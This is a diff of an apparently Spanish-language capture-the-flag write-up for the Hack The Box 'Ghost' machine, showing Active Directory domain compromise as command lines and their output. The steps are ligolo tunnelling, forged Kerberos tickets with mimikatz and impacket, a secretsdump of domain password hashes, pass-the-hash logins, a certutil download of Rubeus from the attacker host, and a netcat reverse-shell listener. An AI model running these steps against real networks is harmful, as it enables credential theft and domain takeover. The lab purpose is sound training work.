@@ -1738,6 +1738,15 @@ ligolo-ng »
 
 
 
+```
+❯ sudo ip tuntap add user kali mode tun ligolo
+❯ sudo ip link set ligolo up
+❯ sudo ip route add 10.0.0.0/24 dev ligolo
+❯ sudo ntpdate -s ghost.htb
+```
+
+
+
 ```bash
 ❯ ls
  agent.exe   proxy
@@ -1767,8 +1776,34 @@ time="2025-02-07T14:07:26-08:00" level=info msg="Connection established" addr="1
 
 
 
+```
+// Some code❯ /opt/ligolo/proxy -selfcert
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+WARN[0000] Using self-signed certificates               
+WARN[0000] TLS Certificate fingerprint for ligolo is: DB1E783AF04CFDBBC26A8A87A1EDAD3E1AB2DC1B9FD699144B66E86A66DAB6BB 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.7.5
+
+ligolo-ng » INFO[0067] Agent joined.                                 id=31530714-8a8b-4acd-8cfd-765668586137 name="NT AUTHORITY\\SYSTEM@PRIMARY" remote="10.10.11.24:49803"
+ligolo-ng » 
+ligolo-ng » session
+? Specify a session : 1 - NT AUTHORITY\SYSTEM@PRIMARY - 10.10.11.24:49803 - 31530714-8a8b-4acd-8cfd-765668586137
+[Agent : NT AUTHORITY\SYSTEM@PRIMARY] » start
+[Agent : NT AUTHORITY\SYSTEM@PRIMARY] » INFO[0074] Starting tunnel to NT AUTHORITY\SYSTEM@PRIMARY (31530714-8a8b-4acd-8cfd-765668586137) 
+```
+
+
+
 ```bash
-❯ impacket-ticketer -aesKey b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -domain corp.ghost.htb  Administrator 2>/dev/null
+❯ impacket-ticketer -aesKey b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -domain corp.ghost.htb Administrator 2>/dev/null
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Creating basic skeleton ticket and PAC Infos
@@ -1794,121 +1829,65 @@ Ticket cache: FILE:Administrator.ccache
 Default principal: Administrator@CORP.GHOST.HTB
 
 Valid starting     Expires            Service principal
-07/02/25 23:08:55  05/02/35 23:08:55  krbtgt/CORP.GHOST.HTB@CORP.GHOST.HTB
-	renew until 05/02/35 23:08:55
-```
-
-
-
-nova
-
-```
-mimikatz # lsadump::trust /patch
-
-Current domain: CORP.GHOST.HTB (GHOST-CORP / S-1-5-21-2034262909-2733679486-179904498)
-
-Domain: GHOST.HTB (GHOST / S-1-5-21-4084500788-938703357-3654145966)
- [  In ] CORP.GHOST.HTB -> GHOST.HTB
-    * 2/7/2025 9:45:55 AM - CLEAR   - 75 85 47 04 86 07 63 03 f4 b5 a6 8f cb 64 a7 7a e5 30 5a 0c 90 5e 03 76 18 ce 79 c9 ce 47 d2 89 a4 55 02 64 6e be 3a c6 92 28 a6 76 4f d2 ea eb 25 72 82 c4 c8 e5 55 55 7b 29 b0 d3 a0 fc 9a 1b 3d c7 98 a3 1d 25 05 49 39 de 68 35 b4 ef e1 38 fa 81 70 0c 51 ad d1 6a 38 a4 5e e0 cf 61 15 98 2a eb d6 3c 5f 18 fa 2e 69 58 7c 9b 25 d6 5d 32 1d f9 c1 5b c4 76 f2 06 0a 46 44 fa 6e 24 a1 84 a8 89 c4 11 eb 75 5b b8 67 64 74 fa 45 ef 4d 60 4d 2d 75 20 35 cb 68 89 ee 2e ee 40 30 5c 3d 7c cc a3 cf fa 66 a0 71 d4 67 eb 9e b2 43 e9 61 d5 68 73 d7 45 9d a9 8d b8 07 6b f0 08 87 14 77 b0 c9 d9 51 7e 43 c3 12 1e a9 d3 8c 7d d0 68 a8 d0 70 8a c0 01 a9 43 43 62 c4 db bd 8f 4b 6d 30 3f 24 9d 66 4c 69 ff 5e 11 36 88 5f 0b aa d2 ee 13 
-	* aes256_hmac       2ebffec8e7479bcd49756acc82db80671cfffcac207232d65b2052c60dfb1bf7
-	* aes128_hmac       7a23ca1cb52263c5cae9baf7a0f09e42
-	* rc4_hmac_nt       6d6f0fb56ad234f6b85ae8be3ae6e2a3
-
- [ Out ] GHOST.HTB -> CORP.GHOST.HTB
-    * 2/7/2025 9:45:13 AM - CLEAR   - 20 d1 cb e4 cf 41 b8 3a a2 bd 83 13 a7 e8 79 07 64 37 29 e5 45 1e 15 98 04 03 40 16 f0 c8 5a 73 f2 7e 09 31 47 48 11 29 40 73 5f 01 80 2c 9b 2d a4 d6 ed 42 00 aa c1 0e fd 18 d0 71 b9 ce f6 60 2b 54 b0 96 ac ad d4 6c 13 c1 cd 09 68 60 85 dc bc 45 a1 2a 75 49 d4 8b 53 aa 72 c3 71 7b c5 f5 e8 52 07 68 52 17 e0 8d c9 cc 16 64 e5 9b b5 7f ee 92 49 af fc df bd 69 14 a8 3b c6 71 ba 25 66 f0 fd 05 4d 3c 01 74 e2 86 d1 b3 3c 41 51 1d 77 6a 7e 47 4e 6a f8 16 a8 0f d1 a2 06 51 5e 78 e1 fb 81 b6 fd d9 0d ae c0 c8 dd b1 42 b5 2b ec 34 dd dc 39 dc ea 8d 90 3c d7 d3 5b fd 2f 73 4b 1c e7 c3 55 93 79 ed 06 e5 1c 92 67 1b 75 7a 27 27 75 b0 b2 00 c4 18 e5 a9 c9 01 9f 33 7c f1 bf 03 a5 ce 10 2c cc cc a3 2b d6 8b 2b 88 e4 c9 6d d2 
-	* aes256_hmac       eb67c47eb93e1e6713b7a891e333e4e57f020a494e1f638ef226adb7023cfdd4
-	* aes128_hmac       98a5cbb5490bf6d30a0f9b615ed15674
-	* rc4_hmac_nt       be0a51897087a382ca0726b2403e6b00
-
- [ In-1] CORP.GHOST.HTB -> GHOST.HTB
-    * 7/22/2024 8:21:26 AM - CLEAR   - de 0b 64 63 58 9d ed e1 bc 36 c0 50 7c 4d 41 6d bd 82 72 e9 98 9b 13 58 b8 68 f1 94 8c ca 12 50 9b af 45 7d 0a 4d 4e 40 e2 7d 12 59 72 2f 87 22 64 c8 fa b2 96 8d aa c1 f1 17 a3 e7 aa 2b ec 87 b5 59 57 71 6f 33 87 4c e0 8a 8b 03 38 a2 71 b6 d5 0b 61 fd 7e 14 3e 46 16 d9 29 d8 f6 f9 05 69 3f b7 4f c1 28 0b 7e ec e5 46 ab 7e e8 2c 8b be 70 b5 d9 6c 96 1b fb 56 33 bc 41 15 b5 73 42 25 54 15 4b b6 fc 55 07 81 60 4a 6b 4c 22 a2 55 61 e5 91 e6 75 e3 62 d4 9a 37 77 bd 63 90 8e 6a 2a 2c c6 88 8f 57 44 7a 9e 35 aa e5 6a 2b 5f c8 0a 8c 4f cb bd af c9 60 59 ff 15 d9 fd cf 27 93 9f f7 19 9e 91 2b 38 d7 0e ec c9 43 e6 8c 3b 60 02 5f b7 c3 c1 67 c2 6b 44 db 1f 9c f7 72 2f 3a 54 6e 62 02 c9 46 d1 b7 3d 26 54 d0 4f 35 65 a8 3f 
-	* aes256_hmac       de2e49c70945c0cb0dec99c93587de84f0b048843b8e295c6da720ba85545ffe
-	* aes128_hmac       b55ca148bc95f95b8cb72f67661e1a08
-	* rc4_hmac_nt       0b0124f5d6c07ad530d6bf6a6404fdaa
-
- [Out-1] GHOST.HTB -> CORP.GHOST.HTB
-    * 2/7/2025 9:45:13 AM - CLEAR   - 78 10 13 24 91 0a 57 22 71 4e f6 ef 53 6a d8 54 02 97 63 0b 78 28 41 b7 5e 5e e6 b7 50 03 35 96 f2 e5 8b a3 c1 21 fa f6 01 f5 5f 7b 38 98 bc 8b 2b f5 3e 91 ce 8a 01 06 59 c0 9b 19 8c d8 d3 1a 17 9f d4 f1 b2 cb a0 49 f6 7f 97 f7 a0 79 63 bb 20 4a bf a3 d9 dd b1 13 20 c6 a0 84 a2 ea 65 79 6a b6 d3 db 17 e9 be b8 c1 35 57 38 c8 3b a6 6a 90 32 66 ba 0e bd fd 67 bf f4 e9 3c f2 e5 37 94 84 d6 c0 71 d3 42 85 ef 4e 94 ac 56 0f df 05 77 1b 74 57 4f a2 07 07 a1 d6 8e ee a1 cd 6a c0 4c d9 3f 16 0a fa 47 07 45 45 ad b5 6d e4 01 b1 e4 bf 76 c2 8e 5b 4e f4 04 ed 08 e4 e0 7e d8 18 5a f5 df 07 c3 97 3d 7e 6d 28 1e c1 1a ec 6d 06 83 0f 27 ea c8 00 af 92 c9 1f f6 50 45 f5 c1 bb 4a 09 bb d6 df 6b cf d6 fe fe d8 44 bb 19 90 46 0b 
-	* aes256_hmac       b50449e019e0a55f9227fb2e830b044e9e9ad9952e2249e5de29f2027cd8f40d
-	* aes128_hmac       81f4c2f21a640eed29861d71a619b4bb
-	* rc4_hmac_nt       ea4e9954536eb29091fc96bbce83be23
+08/02/25 04:14:33  06/02/35 04:14:33  krbtgt/CORP.GHOST.HTB@CORP.GHOST.HTB
+	renew until 06/02/35 04:14:33
 ```
 
 
 
 ```
-PS C:\ProgramData> wmic useraccount get name,sid
-wmic useraccount get name,sid
-Name                  SID                                            
-Administrator         S-1-5-21-2034262909-2733679486-179904498-500   
-Guest                 S-1-5-21-2034262909-2733679486-179904498-501   
-krbtgt                S-1-5-21-2034262909-2733679486-179904498-502   
-Administrator         S-1-5-21-4084500788-938703357-3654145966-500   
-Guest                 S-1-5-21-4084500788-938703357-3654145966-501   
-krbtgt                S-1-5-21-4084500788-938703357-3654145966-502   
-kathryn.holland       S-1-5-21-4084500788-938703357-3654145966-3602  
-cassandra.shelton     S-1-5-21-4084500788-938703357-3654145966-3603  
-robert.steeves        S-1-5-21-4084500788-938703357-3654145966-3604  
-florence.ramirez      S-1-5-21-4084500788-938703357-3654145966-3606  
-justin.bradley        S-1-5-21-4084500788-938703357-3654145966-3607  
-arthur.boyd           S-1-5-21-4084500788-938703357-3654145966-3608  
-beth.clark            S-1-5-21-4084500788-938703357-3654145966-3610  
-charles.gray          S-1-5-21-4084500788-938703357-3654145966-3611  
-jason.taylor          S-1-5-21-4084500788-938703357-3654145966-3612  
-intranet_principal    S-1-5-21-4084500788-938703357-3654145966-3614  
-gitea_temp_principal  S-1-5-21-4084500788-938703357-3654145966-3615 
-```
+❯ secretsdump.py dc01.ghost.htb -k -no-pass -just-dc-ntlm
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cdb17d5c14ff69e7067cffcc9e470bd:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0cdb6ae71c3824f2da2815f69485e128:::
+kathryn.holland:3602:aad3b435b51404eeaad3b435b51404ee:0adf6114ba230ef8f023eca3c0d1af50:::
+cassandra.shelton:3603:aad3b435b51404eeaad3b435b51404ee:96d2251e44e42816314c08b8e1f11b87:::
+robert.steeves:3604:aad3b435b51404eeaad3b435b51404ee:7e2e1e1163ff3fa9304ecd8df6f726fe:::
+florence.ramirez:3606:aad3b435b51404eeaad3b435b51404ee:29542931896c7e7a9fbca17b0dd8ab6a:::
+justin.bradley:3607:aad3b435b51404eeaad3b435b51404ee:a2be8ec65d6b212138cb36422ed32f46:::
+arthur.boyd:3608:aad3b435b51404eeaad3b435b51404ee:b5b7f0787f3c07f42958d33518ae19a5:::
+beth.clark:3610:aad3b435b51404eeaad3b435b51404ee:1582f51fcd02e2e5316d497f2552bb83:::
+charles.gray:3611:aad3b435b51404eeaad3b435b51404ee:d2fe7f2c7484fc550cac49836eabca3d:::
+jason.taylor:3612:aad3b435b51404eeaad3b435b51404ee:0159e6bd4326812f9a6c406ea84035e6:::
+intranet_principal:3614:aad3b435b51404eeaad3b435b51404ee:e9fac15124e1d927cbd71f851792b04f:::
+gitea_temp_principal:3615:aad3b435b51404eeaad3b435b51404ee:2058fa4502750fa5d7ebd874b1ea43a1:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6c3d61860f92e30e8e9744ac5d9783b:::
+LINUX-DEV-WS01$:3630:aad3b435b51404eeaad3b435b51404ee:be14220f3b71b34a61d2d516d595555c:::
+adfs_gmsa$:4101:aad3b435b51404eeaad3b435b51404ee:0bef79ae4d25b1864570212e33922d14:::
+GHOST-CORP$:2101:aad3b435b51404eeaad3b435b51404ee:be0a51897087a382ca0726b2403e6b00:::
+[*] Cleaning up... 
 
-
-S-1-5-21-4084500788-938703357-3654145966-519
-
-
-
-```bash
-mimikatz # kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498 /sid:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:dae1ad83e2af14a379017f244a2f5297 /service:krbtgt /target:GHOST.HTB /ticket:gzzcoo.kirbi
-User      : Administrator
-Domain    : CORP.GHOST.HTB (CORP)
-SID       : S-1-5-21-2034262909-2733679486-179904498
-User Id   : 500
-Groups Id : *513 512 520 518 519 
-ServiceKey: dae1ad83e2af14a379017f244a2f5297 - rc4_hmac_nt      
-Service   : krbtgt
-Target    : GHOST.HTB
-Lifetime  : 2/7/2025 2:34:58 PM ; 2/5/2035 2:34:58 PM ; 2/5/2035 2:34:58 PM
--> Ticket : gzzcoo.kirbi
-
- * PAC generated
- * PAC signed
- * EncTicketPart generated
- * EncTicketPart encrypted
- * KrbCred generated
-
-Final Ticket Saved to file !
 ```
 
 
 
 ```
-❯ ls -l Rubeus.exe
-.rw-r--r-- kali kali 436 KB Fri Feb  7 23:35:07 2025  Rubeus.exe
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+❯ nxc winrm 10.10.11.24 -u 'Administrator' -H '1cdb17d5c14ff69e7067cffcc9e470bd'
+WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
+WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\Administrator:1cdb17d5c14ff69e7067cffcc9e470bd (Pwn3d!)
+
+❯ evil-winrm -i 10.10.11.24 -u 'Administrator' -H '1cdb17d5c14ff69e7067cffcc9e470bd'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
+9aa9bfa25a6aa3ef5e12ae399ac93d51
 ```
 
 
 
-```
-PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/Rubeus.exe Rubeus.exe
-certutil.exe -f -urlcache -split http://10.10.16.7/Rubeus.exe Rubeus.exe
-****  Online  ****
-  000000  ...
-  06d200
-CertUtil: -URLCache command completed successfully.
-```
+OTRO METODO
 
 
-
-otra pruba
 
 
 
@@ -1997,6 +1976,26 @@ Final Ticket Saved to file !
 mimikatz(commandline) # exit
 Bye!
 
+```
+
+
+
+```
+❯ ls -l Rubeus.exe
+.rw-r--r-- kali kali 436 KB Fri Feb  7 23:35:07 2025  Rubeus.exe
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+
+
+```
+PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/Rubeus.exe Rubeus.exe
+certutil.exe -f -urlcache -split http://10.10.16.7/Rubeus.exe Rubeus.exe
+****  Online  ****
+  000000  ...
+  06d200
+CertUtil: -URLCache command completed successfully.
 ```
 
 
@@ -2209,7 +2208,7 @@ d-----         1/30/2024   9:21 AM                VMware
 ```
 PS C:\ProgramData> cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
 cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
-9aa9bfa25a6aa3ef5e12ae399ac93d51// Some code
+9aa9bfa25a6aa3ef5e12ae399ac93d51
 ```
 
 
@@ -2235,8 +2234,8 @@ CertUtil: -URLCache command completed successfully.
 
 
 ```
-❯ rlwrap -cAr nc -nlvp 446
-listening on [any] 443 ...
+❯ rlwrap -cAr nc -nlvp 4444
+listening on [any] 4444...
 ```
 
 
@@ -2253,18 +2252,6 @@ Starting cmd.exe on DC01.ghost.htb...1.ghost.htb...
 ```
 
 
-
-```
-❯ rlwrap -cAr nc -nlvp 446
-listening on [any] 446 ...
-connect to [10.10.16.7] from (UNKNOWN) [10.10.11.24] 49826
-Microsoft Windows [Version 10.0.20348.2582]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\ProgramData>whoami
-whoami
-nt authority\system
-```
 
 
 
